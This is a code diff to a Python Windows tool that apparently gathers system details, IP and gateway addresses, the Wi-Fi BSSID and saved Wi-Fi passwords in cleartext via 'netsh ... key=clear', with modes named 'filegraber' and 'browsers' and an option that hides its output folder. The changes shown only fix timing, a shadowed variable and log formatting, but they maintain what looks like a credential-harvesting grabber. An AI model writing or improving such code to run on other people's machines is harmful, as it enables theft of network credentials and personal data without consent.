@@ -16,6 +16,7 @@ import requests
 import netifaces
 import GPUtil
 import psutil
+import time
 from win32com.client import GetObject
 from win32api import GetSystemMetrics
 from shutil import copyfile
@@ -24,20 +25,20 @@ try:
     if __name__ == "__main__":
         if "all" in str(sys.argv) or "network" in str(sys.argv) or "hardware" in str(sys.argv) or "filegraber" in str(
                 sys.argv) or "browsers" in str(sys.argv):
-            starttime = datetime.datetime.now().strftime("%S")
+            starttime = time.time()
             windll = ctypes.windll.kernel32
             lang = locale.windows_locale[windll.GetUserDefaultUILanguage()]
             encoding = locale.getpreferredencoding()
             typeos = platform.system() + " " + platform.release()
             timedate = datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")
-            time = datetime.datetime.now().strftime("%H:%M:%S").replace(":", "-", 2)
+            timed = datetime.datetime.now().strftime("%H:%M:%S").replace(":", "-", 2)
             user = getpass.getuser()
             hostname = socket.gethostname()
             iip = socket.gethostbyname(socket.gethostname())
             gatewayip = netifaces.gateways()["default"][netifaces.AF_INET][0]
             prefix = "{~}"
             timedate = prefix + " " + timedate
-            dirname = user + "_" + time
+            dirname = user + "_" + timed
             dio = dirname
             os.makedirs(dirname)
 
@@ -56,7 +57,7 @@ try:
                     global bssidstr
                     output = subprocess.check_output(["netsh", "wlan", "show", "interfaces"]).decode(encoding).split(
                         "\n")
-                    bssidstr = str(output[9][29:])
+                    bssidstr = str(output[9].split()[2])
                 except Exception:
                     return None
             get_bssid()
@@ -107,7 +108,7 @@ try:
                     profiles = [i.split(":")[1][1:-1] for i in data if one in i]
                     if "-q" not in str(sys.argv):
                         print(" 	 Wi-Fi's [")
-                    logfile.write("	 Wi-Fi's [\n")
+                    logfile.write("\n	 Wi-Fi's [\n")
                     for i in profiles:
                         results = subprocess.check_output(["netsh", "wlan", "show", "profile", i, "key=clear"]).decode(
                             encoding).split("\n")
@@ -137,7 +138,7 @@ try:
      External ip: {1}
      Internal ip: {2}
      Gateway ip: {3}
-     BSSID:{4}""".format(prefix, eip, iip, gatewayip, bssidstr))
+     BSSID: {4}""".format(prefix, eip, iip, gatewayip, bssidstr))
                 if lang == "en_US":
                     networkpass("All User Profile", "Key Content")
                     if "-q" not in str(sys.argv):
@@ -509,7 +510,7 @@ try:
             if "-xh" in str(sys.argv):
                 ctypes.windll.kernel32.SetFileAttributesW(dio, 0x02)
 
-            totaltime = int(datetime.datetime.now().strftime("%S")) - int(starttime)
+            totaltime = time.time() - starttime
             logfile.write("\n    Elapsed time: %s second's\n)" % totaltime)
             logfile.close()
 
